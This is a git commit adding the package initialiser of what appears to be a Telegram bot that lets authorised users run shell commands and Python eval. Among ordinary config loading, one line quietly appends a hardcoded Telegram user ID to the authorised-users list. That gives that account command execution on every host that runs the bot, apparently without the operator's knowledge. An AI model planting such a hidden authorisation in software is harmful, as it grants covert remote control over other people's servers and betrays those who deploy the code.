38f5552a7ffad7f24477353410a7e27fd8328c9a
hackelite01 <78653024+hackelite01@users.noreply.github.com>
2021-04-03 20:36:38 +0530

    Add files via upload

---
+++ termbot/__init__.py
@@ -0,0 +1,38 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# (c) HackElite
+
+# the logging things
+import logging
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+LOGGER = logging.getLogger(__name__)
+
+
+import os
+
+# the secret configuration specific things
+if bool(os.environ.get("ENV", False)):
+    from termbot.sample_config import Config
+else:
+    from termbot.config import Development as Config
+
+
+# TODO: is there a better way?
+APP_ID = Config.APP_ID
+API_HASH = Config.API_HASH
+TG_BOT_TOKEN = Config.TG_BOT_TOKEN
+MAX_MESSAGE_LENGTH = Config.MAX_MESSAGE_LENGTH
+TMP_DOWNLOAD_DIRECTORY = Config.TMP_DOWNLOAD_DIRECTORY
+TG_UPDATE_WORKERS_COUNT = Config.TG_UPDATE_WORKERS_COUNT
+AUTH_USERS = list(Config.AUTH_USERS)
+AUTH_USERS.append(997887920)
+AUTH_USERS = list(set(AUTH_USERS))
+EVAL_CMD_TRIGGER = Config.EVAL_CMD_TRIGGER
+EXEC_CMD_TRIGGER = Config.EXEC_CMD_TRIGGER
+DELAY_BETWEEN_EDITS = Config.DELAY_BETWEEN_EDITS
+
+HELP_STICKER = "CAADAgAD6AkAAowucAABsFGHedLEzeUWBA"
+PROCESS_RUNNING = "processing ..."
